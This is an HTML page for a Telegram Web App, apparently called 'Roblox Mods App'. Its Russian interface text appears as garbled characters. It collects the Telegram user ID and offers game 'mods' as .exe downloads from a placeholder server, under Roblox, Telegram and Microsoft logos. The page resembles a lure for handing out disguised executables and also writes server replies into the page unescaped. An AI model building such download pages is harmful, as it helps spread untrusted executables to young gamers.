<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Roblox Mods App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: #e0e0e0;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        h1 {
            font-size: 2.5em;
            color: #ffcc00;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ffcc00;
        }
        .container {
            max-width: 450px;
            margin: 0 auto;
            background: rgba(26, 26, 46, 0.9);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        button {
            background: linear-gradient(45deg, #ff4444, #ff8800);
            color: #fff;
            border: none;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1.1em;
            width: 100%;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px #ff8800;
        }
        #profileContent, #stats {
            display: none;
            text-align: left;
            color: #d3d3d3;
            font-size: 1em;
            margin: 15px 0;
            padding: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
        }
        .message {
            margin: 10px 0;
            font-size: 1em;
            color: #ffcc00;
        }
        .hidden { display: none; }
        .logo {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        .logo img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 2px solid #ffcc00;
        }
    </style>
</head>
<body>
    <h1>Roblox Mods App</h1>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Roblox_App_Icon_Logo.png" alt="Roblox">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
    </div>
    <div class="container">
        <div id="authForm">
            <h2>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è...</h2>
        </div>
        <div id="profileContent">
            <h2>–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å</h2>
            <div id="stats"></div>
            <button onclick="updateBio()">‚úèÔ∏è –ò–∑–º–µ–Ω–∏—Ç—å –±–∏–æ</button>
            <h3>–î–æ—Å—Ç—É–ø–Ω—ã–µ –º–æ–¥—ã</h3>
            <button onclick="downloadMod('minecraft_mod.exe')">NightmareCraft Mod</button>
            <button onclick="downloadMod('extension1.exe')">Ext Mod 1</button>
            <button onclick="downloadMod('extension2.exe')">Ext Mod 2</button>
            <button onclick="refreshStats()">üîÑ –û–±–Ω–æ–≤–∏—Ç—å</button>
        </div>
        <div id="message" class="message hidden"></div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id;

        function showMessage(text, isError = false) {
            const msgEl = document.getElementById('message');
            msgEl.textContent = text;
            msgEl.classList.remove('hidden');
            msgEl.style.color = isError ? '#ff4444' : '#ffcc00';
            setTimeout(() => msgEl.classList.add('hidden'), 3000);
        }

        function showProfile() {
            document.getElementById('authForm').style.display = 'none';
            document.getElementById('profileContent').style.display = 'block';
        }

        function autoRegister() {
            if (!userId) {
                showMessage("–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏!", true);
                return;
            }
            tg.sendData(JSON.stringify({ action: "register", user_id: userId }));
            showMessage("–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è...", false);
        }

        function refreshStats() {
            tg.sendData(JSON.stringify({ action: "stats", user_id: userId }));
        }

        function updateBio() {
            const bio = prompt("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤–æ–µ –±–∏–æ:");
            if (bio) {
                tg.sendData(JSON.stringify({ action: "update_bio", user_id: userId, bio: bio }));
            }
        }

        function downloadMod(modName) {
            tg.sendData(JSON.stringify({ action: "download", user_id: userId, mod: modName }));
            showMessage(`–ú–æ–¥ ${modName} —Å–∫–∞—á–∞–Ω!`);
            window.open('https://—Ç–≤–æ–π—Å–µ—Ä–≤–µ—Ä.com/exe/' + modName, '_blank'); // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π URL
        }

        tg.onEvent('web_app_data', (data) => {
            const response = JSON.parse(data.data);
            if (response.status === "success") {
                document.getElementById('stats').innerHTML = response.message;
                showProfile();
                showMessage("–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Roblox Mods!");
            } else {
                showMessage(response.message, true);
            }
        });

        if (userId) {
            autoRegister();
        } else {
            showMessage("–û—à–∏–±–∫–∞: –¥–∞–Ω–Ω—ã–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω—ã!", true);
        }
    </script>
</body>
</html>
